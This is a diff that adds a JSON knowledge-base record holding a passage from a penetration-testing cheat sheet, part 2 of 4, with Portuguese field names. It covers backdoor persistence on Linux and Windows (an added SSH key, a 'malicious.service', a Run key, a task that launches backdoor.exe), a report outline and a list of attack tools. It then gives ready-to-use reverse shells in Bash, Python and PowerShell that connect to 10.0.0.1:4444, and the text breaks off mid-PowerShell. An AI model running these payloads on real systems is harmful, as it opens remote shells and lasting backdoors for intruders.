@@ -1,0 +1,13 @@
+{
+  "id": "Penetration_Testing_Advanced_1_2026-05-07T14:35:24.361165",
+  "titulo": "Penetration Testing Advanced - Parte 2/4",
+  "conteudo": "# SSH authorized_keys\necho \"ssh-rsa AAAA...\" >> ~/.ssh/authorized_keys\n\n# Service creation\nsystemctl enable malicious.service\n```\n\n**Windows:**\n```powershell\n# Registry run keys\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\n\n# Scheduled tasks\nschtasks /create /tn \"Update\" /tr \"C:\\backdoor.exe\" /sc onlogon\n\n# WMI events\n```\n\n### 6. REPORTING\n**Estrutura do Relatório:**\n1. Executive Summary\n2. Scope & Methodology\n3. Findings (Critical → Low)\n4. Evidence (Screenshots, Logs)\n5. Remediation Steps\n6. Appendix (Full technical details)\n\n**Métricas CVSS:**\n- CVSS Score calculation\n- Impact vs Exploitability\n- Temporal metrics\n- Environmental factors\n\n## FERRAMENTAS ESSENCIAIS\n\n### Network Scanning\n- Nmap: Port scanning, service detection\n- Masscan: Ultra-fast port scanner\n- Unicornscan: Asynchronous network stimulus\n\n### Web Application\n- Burp Suite Professional\n- OWASP ZAP\n- SQLmap: Automated SQL injection\n- Nikto: Web server scanner\n\n### Exploitation\n- Metasploit Framework\n- Exploit-DB / SearchSploit\n- Commix: Command injection\n- BeEF: Browser exploitation\n\n### Post-Exploitation\n- Mimikatz: Credential extraction\n- BloodHound: AD attack paths\n- Empire/Covenant: C2 frameworks\n- LinPEAS/WinPEAS: Privilege escalation\n\n### Password Cracking\n- Hashcat: GPU-accelerated\n- John the Ripper\n- Hydra: Network login cracker\n- CeWL: Custom wordlist generator\n\n## PAYLOADS & SHELLS\n\n### Reverse Shells\n**Bash:**\n```bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n```\n\n**Python:**\n```python\nimport socket,subprocess,os\ns=socket.socket()\ns.connect((\"10.0.0.1\",4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call([\"/bin/sh\",\"-i\"])\n```\n\n**PowerShell:**\n```powershell\n$client = New-Object System.Net.Sockets.TCPClient(\"10.0.0.1\",4444)\n$stream = $client.GetStream()\n[byte[]]$bytes = 0..65535|%{0}\nwhile(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){\n    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)\n    $sendback = (",
+  "tags": [
+    "pentest",
+    "hacking",
+    "nmap"
+  ],
+  "fonte": "Penetration Testing Advanced",
+  "tipo": "conhecimento_tecnico_cybersecurity",
+  "criado_em": "2026-05-07T14:35:24.361168"
+}
